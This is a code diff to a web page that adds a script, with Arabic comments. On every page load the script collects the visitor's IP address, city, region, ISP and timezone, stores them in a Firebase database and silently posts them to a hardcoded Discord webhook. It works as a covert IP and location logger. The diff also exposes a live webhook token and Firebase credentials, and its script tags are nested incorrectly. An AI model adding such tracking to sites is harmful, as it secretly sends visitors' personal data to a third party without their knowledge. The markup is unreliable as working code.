@@ -266,6 +266,103 @@ fetch("https://api64.ipify.org?format=json")
       });
   });
 
+  <!-- === تهيئة Firebase === -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
+  import { getDatabase, ref, push, get, child } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBXWRT_Vop_2BzynSGEIP8G_bRONnu5RiA",
+    authDomain: "sdadas-df565.firebaseapp.com",
+    projectId: "sdadas-df565",
+    storageBucket: "sdadas-df565.firebasestorage.app",
+    messagingSenderId: "1040188248458",
+    appId: "1:1040188248458:web:a6aadd60bd205fb30d3873",
+    measurementId: "G-JRR2JBEMZK",
+    databaseURL: "https://sdadas-df565-default-rtdb.firebaseio.com/"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // === دالة حفظ الزائر في Firebase ===
+  function saveVisitor(info) {
+    const visitorsRef = ref(db, "visitors");
+    const visitorData = {
+      ip: info.ip,
+      city: info.city,
+      region: info.region,
+      country: info.country,
+      org: info.org,
+      timezone: info.timezone,
+      time: new Date().toLocaleString()
+    };
+    push(visitorsRef, visitorData);
+  }
+
+  // === دالة تحديث عدد المشاهدات ===
+  function updateViewCounter() {
+    const dbRef = ref(db);
+    get(child(dbRef, "visitors")).then(snapshot => {
+      if (snapshot.exists()) {
+        const count = Object.keys(snapshot.val()).length;
+
+        // إنشاء عنصر المشاهدات أسفل صندوق المعلومات
+        let viewBox = document.getElementById("view-counter");
+        if (!viewBox) {
+          viewBox = document.createElement("div");
+          viewBox.id = "view-counter";
+          viewBox.style.cssText =
+            "margin-top:10px;font-size:1.4em;color:#ff0000;text-align:center;display:flex;align-items:center;gap:6px;";
+
+          viewBox.innerHTML = `<span style="font-size:1.4em;">👁️</span> <span id="views-num">0</span>`;
+          document.getElementById("ip-info").after(viewBox);
+        }
+
+        document.getElementById("views-num").textContent = count;
+      }
+    });
+  }
+
+  // === تعديل كود جلب IP حتى يحفظ داخل Firebase أيضًا ===
+  window.onload = function() {
+    fetch("https://api64.ipify.org?format=json")
+      .then(r => r.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        fetch('https://ipinfo.io/json')
+          .then(r => r.json())
+          .then(info => {
+            delete info.readme;
+            info.ip = ip;
+
+            // عرض البيانات
+            document.getElementById('ip-info').textContent = JSON.stringify(info, null, 2);
+
+            // حفظ البيانات في Firebase
+            saveVisitor(info);
+
+            // تحديث عداد المشاهدات
+            updateViewCounter();
+
+            // إرسال Webhook
+            const webhookURL = "https://canary.discord.com/api/webhooks/1406835678381215875/fvpexHZCIFXoEheK0iMv_dE9Bq9gt0hWuJnyv7hG4JrORkGoSMoqCalKEyagRdymQIJu";
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                content: "🧠 New Visitor:\n```json\n" +
+                  JSON.stringify(info, null, 2) +
+                "\n```"
+              })
+            });
+          });
+      });
+  };
+</script>
+
+  
 </script>
 </body>
 </html>
+
